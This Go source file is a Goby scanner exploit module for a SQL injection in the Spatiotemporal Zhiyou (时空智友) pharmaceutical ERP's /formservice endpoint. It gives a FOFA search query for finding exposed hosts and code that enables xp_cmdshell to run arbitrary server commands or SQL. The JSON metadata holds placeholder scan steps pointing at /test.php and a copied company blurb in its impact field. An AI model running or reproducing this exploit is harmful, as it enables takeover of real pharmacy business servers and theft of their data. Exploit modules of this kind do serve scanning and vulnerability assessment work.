package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Spatiotemporal Intelligent Friend ERP /formservice SQL Injection Vulnerability",
    "Description": "<p>Spatiotemporal Zhiyou is a comprehensive solution provider for pharmaceutical industry informatization, covering pharmacy ERP, CRM, WMS, mobile Internet and pharmaceutical new retail, smart pharmacy, intelligent manufacturing, using information technology to help the pharmaceutical industry change, and working with customers to build a large health industry.</p><p>The command execution vulnerability exists in the Spatiotemporal Smartfriend system. An attacker can run arbitrary commands on the server through this vulnerability to obtain server permissions and control the entire web server.</p>",
    "Product": "Spatiotemporal Zhiyou",
    "Homepage": "http://www.bjskzy.com/",
    "DisclosureDate": "2024-03-29",
    "PostTime": "2024-03-29",
    "Author": "marsjob@163.com",
    "FofaQuery": "body=\"login.jsp?login=null\"",
    "GobyQuery": "body=\"login.jsp?login=null\"",
    "Level": "3",
    "Impact": "<p>Spatiotemporal Zhiyou is a comprehensive solution provider for pharmaceutical industry informatization, covering pharmacy ERP, CRM, WMS, mobile Internet and pharmaceutical new retail, smart pharmacy, intelligent manufacturing, using information technology to help the pharmaceutical industry change, and working with customers to build a large health industry.</p>",
    "Recommendation": "<p>The manufacturer has released a fix for the vulnerability, please contact the manufacturer for updates: <a href=\"http://www.bjskzy.com/\">http://www.bjskzy.com/</a></p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "cmd,sql,user",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": "attackType=cmd"
        },
        {
            "name": "sql",
            "type": "input",
            "value": "SELECT @@VERSION AS 'SQL Server Version';",
            "show": "attackType=sql"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection",
        "Command Execution",
        "HW-2023"
    ],
    "VulType": [
        "Command Execution",
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.3",
    "Translation": {
        "CN": {
            "Name": "时空智友ERP /formservice SQL 注入漏洞",
            "Product": "时空智友ERP",
            "Description": "<p><font>时空智友是医药行业信息化全面解决方案提供商</font>,业务涵盖药店ERP、CRM、WMS、移动互联及医药新零售、智慧药店、智能智造,利用信息技术助力医药行业产业变革,与客户一起,共建大健康产业。<br></p><p>时空智友系统存在命令执行漏洞，攻击者可通过该漏洞在服务器端任意执行命令，写入后门，获取服务器权限，进而控制整个 web 服务器。</p>",
            "Recommendation": "<p>厂商已发布漏洞修复程序，请联系厂商更新：<a href=\"http://www.bjskzy.com/\">http://www.bjskzy.com/</a><a href=\"https://www.esafenet.com/\" target=\"_blank\"></a></p>",
            "Impact": "<p><font>时空智友是医药行业信息化全面解决方案提供商</font>,业务涵盖药店ERP、CRM、WMS、移动互联及医药新零售、智慧药店、智能智造,利用信息技术助力医药行业产业变革,与客户一起,共建大健康产业。<br></p>",
            "VulType": [
                "SQL注入",
                "命令执行"
            ],
            "Tags": [
                "SQL注入",
                "命令执行",
                "HW-2023"
            ]
        },
        "EN": {
            "Name": "Spatiotemporal Intelligent Friend ERP /formservice SQL Injection Vulnerability",
            "Product": "Spatiotemporal Zhiyou",
            "Description": "<p>Spatiotemporal Zhiyou is a comprehensive solution provider for pharmaceutical industry informatization, covering pharmacy ERP, CRM, WMS, mobile Internet and pharmaceutical new retail, smart pharmacy, intelligent manufacturing, using information technology to help the pharmaceutical industry change, and working with customers to build a large health industry.</p><p>The command execution vulnerability exists in the Spatiotemporal Smartfriend system. An attacker can run arbitrary commands on the server through this vulnerability to obtain server permissions and control the entire web server.</p>",
            "Recommendation": "<p>The manufacturer has released a fix for the vulnerability, please contact the manufacturer for updates:&nbsp;<a href=\"http://www.bjskzy.com/\">http://www.bjskzy.com/</a><br></p>",
            "Impact": "<p>Spatiotemporal Zhiyou is a comprehensive solution provider for pharmaceutical industry informatization, covering pharmacy ERP, CRM, WMS, mobile Internet and pharmaceutical new retail, smart pharmacy, intelligent manufacturing, using information technology to help the pharmaceutical industry change, and working with customers to build a large health industry.<br></p>",
            "VulType": [
                "Command Execution",
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection",
                "Command Execution",
                "HW-2023"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocGlobalParams": {},
    "ExpGlobalParams": {},
    "PocId": "10967"
}`

	sendPayloadGetValidateLoginUserServiceXOIUWXCOAIJEOD := func(hostInfo *httpclient.FixUrl, cmd string) (*httpclient.HttpResponse, error) {
		postRequestConfig := httpclient.NewPostRequestConfig("/formservice?service=workflow.sqlResult")
		postRequestConfig.VerifyTls = false
		postRequestConfig.FollowRedirect = false
		postRequestConfig.Header.Store("Content-Type", "application/json")
		//postRequestConfig.Header.Store("Content-Type", "application/x-www-form-urlencoded")
		postRequestConfig.Data = "{\"sql\":\"" + cmd + "\", \"params\":{\"x\":\"x\"}}"
		return httpclient.DoHttpRequest(hostInfo, postRequestConfig)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			resp, _ := sendPayloadGetValidateLoginUserServiceXOIUWXCOAIJEOD(hostInfo, "SELECT @@VERSION AS 'SQL Server Version';")
			success := resp != nil && strings.Contains(resp.Utf8Html, "Microsoft SQL Server") && strings.Contains(resp.Utf8Html, "Microsoft Corporation")
			if success {
				stepLogs.VulURL = hostInfo.FixedHostInfo + `/formservice?service=workflow.sqlResult`
			}
			return success
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := ss.Params["attackType"].(string)
			if attackType == "cmd" {
				cmd := ss.Params["cmd"].(string)
				sendPayloadGetValidateLoginUserServiceXOIUWXCOAIJEOD(expResult.HostInfo, "EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE;")
				resp, err := sendPayloadGetValidateLoginUserServiceXOIUWXCOAIJEOD(expResult.HostInfo, "exec xp_cmdshell ' "+cmd+"'")
				if err != nil {
					expResult.Success = false
				} else if resp.StatusCode == 200 && len(resp.Utf8Html) > 0 && strings.Contains(resp.Utf8Html, "<root>") {
					expResult.Success = true
					expResult.Output = resp.Utf8Html[strings.Index(resp.Utf8Html, "<root>")+len("<root>") : strings.Index(resp.Utf8Html, "</root>")]
				} else {
					expResult.Success = true
					expResult.Output = "xp_cmdshell提权失败，请尝试其他利用方式!!!!!\n" + resp.Utf8Html[strings.Index(resp.Utf8Html, "<errmsg>")+len("<errmsg>"):strings.Index(resp.Utf8Html, "</errmsg>")]
				}
			} else if attackType == "user" {
				resp, err := sendPayloadGetValidateLoginUserServiceXOIUWXCOAIJEOD(expResult.HostInfo, "SELECT USER_NAME() AS 'Current User';")
				if err != nil {
					expResult.Success = false
					expResult.Output = err.Error()
				} else if resp.StatusCode == 200 && len(resp.Utf8Html) > 0 {
					expResult.Success = true
					expResult.Output = "当前用户为：" + resp.Utf8Html[strings.Index(resp.Utf8Html, "<root>")+len("<root>"):strings.Index(resp.Utf8Html, "</root>")]
				}
			} else if attackType == "sql" {
				sql := ss.Params["sql"].(string)
				resp, err := sendPayloadGetValidateLoginUserServiceXOIUWXCOAIJEOD(expResult.HostInfo, sql)
				if err != nil {
					expResult.Success = false
					expResult.Output = err.Error()
				} else if resp.StatusCode == 200 && len(resp.Utf8Html) > 0 {
					expResult.Success = true
					expResult.Output = resp.Utf8Html[strings.Index(resp.Utf8Html, "<root>")+len("<root>") : strings.Index(resp.Utf8Html, "</root>")]
				}
			} else {
				expResult.Success = false
				expResult.Output = `未知的利用方式`
			}
			return expResult
		},
	))
}
